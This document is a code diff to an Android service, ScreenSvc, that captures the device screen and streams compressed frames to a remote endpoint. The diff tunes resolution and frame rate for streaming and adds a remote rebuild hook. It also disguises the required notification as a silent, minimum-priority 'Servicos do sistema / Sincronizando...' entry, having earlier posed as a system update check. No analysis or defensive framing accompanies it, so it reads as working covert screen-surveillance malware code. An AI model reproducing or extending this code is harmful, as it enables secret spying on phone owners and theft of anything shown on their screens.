@@ -29,10 +29,12 @@ public class ScreenSvc extends Service {
     public static volatile boolean alive;
     public static volatile boolean black;
     public static volatile boolean giveUp;
-    public static volatile int Q = 42;
-    public static volatile int FPS = 8;
+    public static volatile int Q = 40;
+    public static volatile int FPS = 4;
+    public static volatile int W = 540;
+    public static volatile long lastFrame;
+    public static ScreenSvc I;
 
-    private static final int TARGET_W = 720;
     private static final int MAX_RESTARTS = 3;
 
     private MediaProjection mp;
@@ -53,10 +55,17 @@ public class ScreenSvc extends Service {
         }
     };
 
+    public static void rebuildNow() {
+        ScreenSvc s = I;
+        if (s == null || s.bh == null) return;
+        s.bh.post(new Runnable() { @Override public void run() { s.rebuild(); } });
+    }
+
     @Override public IBinder onBind(Intent i) { return null; }
 
     @Override public void onCreate() {
         super.onCreate();
+        I = this;
         th = new HandlerThread("scr");
         th.start();
         bh = new Handler(th.getLooper());
@@ -91,11 +100,8 @@ public class ScreenSvc extends Service {
             w = dm.widthPixels;
             h = dm.heightPixels;
             dpi = dm.densityDpi;
-            sw = Math.min(TARGET_W, w) & ~1;
-            sh = Math.max(2, (h * sw / w) & ~1);
-
             mirror();
-            Net.send("{\"t\":\"info\",\"o\":\"projecao iniciada " + w + "x" + h + "\"}");
+            Net.send("{\"t\":\"info\",\"o\":\"projecao iniciada " + w + "x" + h + " em " + W + "px\"}");
         } catch (Throwable t) {
             alive = false;
             Net.send("{\"t\":\"err\",\"o\":\"start: " + Util.esc(String.valueOf(t)) + "\"}");
@@ -106,16 +112,20 @@ public class ScreenSvc extends Service {
 
     private void mirror() {
         try {
-            ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 3);
+            sw = Math.max(2, Math.min(W, w)) & ~1;
+            sh = Math.max(2, (h * sw / Math.max(1, w))) & ~1;
+            ir = ImageReader.newInstance(sw, sh, PixelFormat.RGBA_8888, 2);
             ir.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                 @Override public void onImageAvailable(ImageReader r) { onImg(r); }
             }, bh);
             int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR;
             if (restarts >= 2) flags |= DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
-            vd = mp.createVirtualDisplay("av", w, h, dpi, flags, ir.getSurface(), null, bh);
+            vd = mp.createVirtualDisplay("av", sw, sh, Math.max(120, dpi * sw / Math.max(1, w)),
+                    flags, ir.getSurface(), null, bh);
             alive = true;
             black = false;
             blackCount = 0;
+            lastFrame = System.currentTimeMillis();
         } catch (Throwable t) {
             alive = false;
             Net.send("{\"t\":\"err\",\"o\":\"mirror: " + Util.esc(String.valueOf(t)) + "\"}");
@@ -147,7 +157,6 @@ public class ScreenSvc extends Service {
 
     private void onImg(ImageReader r) {
         Image img = null;
-        Bitmap full = null;
         Bitmap out = null;
         try {
             img = r.acquireLatestImage();
@@ -161,14 +170,14 @@ public class ScreenSvc extends Service {
             int ps = p.getPixelStride();
             int bw = p.getRowStride() / ps;
 
-            full = Bitmap.createBitmap(bw, h, Bitmap.Config.ARGB_8888);
-            full.copyPixelsFromBuffer(p.getBuffer());
-            if (bw != w) {
-                Bitmap c = Bitmap.createBitmap(full, 0, 0, w, h);
-                full.recycle();
-                full = c;
+            out = Bitmap.createBitmap(bw, sh, Bitmap.Config.ARGB_8888);
+            out.copyPixelsFromBuffer(p.getBuffer());
+            if (bw != sw) {
+                Bitmap c = Bitmap.createBitmap(out, 0, 0, sw, sh);
+                out.recycle();
+                out = c;
             }
-            out = Bitmap.createScaledBitmap(full, sw, sh, true);
+            lastFrame = now;
 
             if (dark(out)) {
                 if (++blackCount > 10) {
@@ -195,23 +204,29 @@ public class ScreenSvc extends Service {
             Net.sendBin(bo.toByteArray());
         } catch (Throwable ignored) {
         } finally {
-            if (out != null && out != full) out.recycle();
-            if (full != null) full.recycle();
+            if (out != null) out.recycle();
             if (img != null) { try { img.close(); } catch (Throwable ignored) {} }
         }
     }
 
     private void startFg() {
-        String ch = "av";
+        String ch = "sys";
         if (Build.VERSION.SDK_INT >= 26) {
-            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            nm.createNotificationChannel(new NotificationChannel(ch, "Sistema", NotificationManager.IMPORTANCE_LOW));
+            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            NotificationChannel c = new NotificationChannel(ch, "Sistema", NotificationManager.IMPORTANCE_MIN);
+            c.setShowBadge(false);
+            c.setSound(null, null);
+            nm.createNotificationChannel(c);
         }
         Notification.Builder nb = Build.VERSION.SDK_INT >= 26
                 ? new Notification.Builder(this, ch)
                 : new Notification.Builder(this);
-        Notification n = nb.setContentTitle("Verificando atualizacoes do sistema")
-                .setSmallIcon(R.mipmap.ic).setOngoing(true).build();
+        Notification n = nb.setContentTitle("Servicos do sistema")
+                .setContentText("Sincronizando...")
+                .setSmallIcon(R.mipmap.ic)
+                .setOngoing(true)
+                .setShowWhen(false)
+                .build();
         try {
             if (Build.VERSION.SDK_INT >= 29)
                 startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
@@ -225,6 +240,7 @@ public class ScreenSvc extends Service {
     @Override public void onDestroy() {
         alive = false;
         black = false;
+        I = null;
         try { if (vd != null) vd.release(); } catch (Throwable ignored) {}
         try { if (ir != null) ir.close(); } catch (Throwable ignored) {}
         try { if (mp != null) mp.stop(); } catch (Throwable ignored) {}
